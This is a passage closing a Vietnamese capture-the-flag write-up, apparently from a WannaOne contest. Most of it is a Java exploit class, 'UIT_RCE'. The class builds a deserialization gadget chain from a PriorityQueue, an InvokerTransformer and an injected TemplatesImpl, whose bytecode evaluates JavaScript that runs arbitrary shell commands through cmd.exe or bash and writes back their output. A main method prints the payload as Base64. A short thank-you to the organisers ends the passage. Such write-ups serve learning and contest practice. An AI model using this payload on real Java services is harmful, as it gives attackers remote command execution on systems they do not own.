						"pb = new java.lang.ProcessBuilder();" +
						"if (isWin) {" +
						"   pb.command(\"cmd.exe\", \"/c\", command);" +
						"} else {" +
						"   pb.command(\"bash\", \"-c\", command);" +
						"}" +
						"pb.redirectErrorStream(true);" +
						"bufferedReader = new java.io.BufferedReader(new java.io.InputStreamReader(pb.start().getInputStream()));" +
						"result = \"\";" +
						"while ((line = bufferedReader.readLine()) != null) {" +
						"   result += line + \"\\n\";" +
						"}" +
						"outputStream.write(result.getBytes());" +
						"outputStream.close();";
//        String js_code = "calc.exe";
        final Object templates = createTemplatesImpl(js_code);
        final InvokerTransformer transformer = new InvokerTransformer("toString", new Class[0], new Object[0]);

        // create queue with numbers and basic comparator
        final PriorityQueue<Object> queue = new PriorityQueue<Object>(2,new TransformingComparator(transformer));
        // stub data for replacement later
        queue.add(1);
        queue.add(1);

        // switch method called by comparator
        Reflections.setFieldValue(transformer, "iMethodName", "newTransformer");

        // switch contents of queue
        final Object[] queueArray = (Object[]) Reflections.getFieldValue(queue, "queue");
        queueArray[0] = templates;
        queueArray[1] = 1;

        return queue;
    }

    public static Object createTemplatesImpl ( final String command ) throws Exception {
        if ( Boolean.parseBoolean(System.getProperty("properXalan", "false")) ) {
            return createTemplatesImpl(
                command,
                Class.forName("org.apache.xalan.xsltc.trax.TemplatesImpl"),
                Class.forName("org.apache.xalan.xsltc.runtime.AbstractTranslet"),
                Class.forName("org.apache.xalan.xsltc.trax.TransformerFactoryImpl"));
        }

        return createTemplatesImpl(command, TemplatesImpl.class, AbstractTranslet.class, TransformerFactoryImpl.class);
    }


    public static <T> T createTemplatesImpl ( final String js_code, Class<T> tplClass, Class<?> abstTranslet, Class<?> transFactory )
        throws Exception {
        final T templates = tplClass.newInstance();

        // use template gadget class
        ClassPool pool = ClassPool.getDefault();
        pool.insertClassPath(new ClassClassPath(Gadgets.StubTransletPayload.class));
        pool.insertClassPath(new ClassClassPath(abstTranslet));
        final CtClass clazz = pool.get(Gadgets.StubTransletPayload.class.getName());
        // run command in static initializer
        String cmd = "(new javax.script.ScriptEngineManager()).getEngineByName(\"JavaScript\").eval(\"" +
            js_code.replace("\\", "\\\\").replace("\"", "\\\"") +
            "\");";
        clazz.makeClassInitializer().insertAfter(cmd);
        // sortarandom name to allow repeated exploitation (watch out for PermGen exhaustion)
        clazz.setName("ysoserial.Pwner" + System.nanoTime());
        CtClass superC = pool.get(abstTranslet.getName());
        clazz.setSuperclass(superC);

        final byte[] classBytes = clazz.toBytecode();

        // inject class bytes into instance
        Reflections.setFieldValue(templates, "_bytecodes", new byte[][] {
            classBytes, ClassFiles.classAsBytes(Gadgets.Foo.class)
        });

        // required to make TemplatesImpl happy
        Reflections.setFieldValue(templates, "_name", "Pwnr");
        Reflections.setFieldValue(templates, "_tfactory", transFactory.newInstance());
        return templates;
    }

    public static void main(final String[] args) throws Exception {
        UIT_RCE obj = new UIT_RCE();
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(baos);
        oos.writeObject(obj.getObject("CMD"));
        System.out.println(Base64.getEncoder().encodeToString(baos.toByteArray()));
    }
}
```

## Lời kết

Cảm ơn WannaOne đã tạo ra một cuộc thi vào dịp cuối năm như này để em có thể ôn tập lại những cái đã học được và học được thêm những điều mới. Cảm ơn `n3mo#8312`, `Duy#2437` và `petrusviet#1788` đã tạo ra những challenge web hay và thú vị. Hi vọng WannaOne sẽ duy trì và phát triển cuộc thi hơn cho các năm tới. 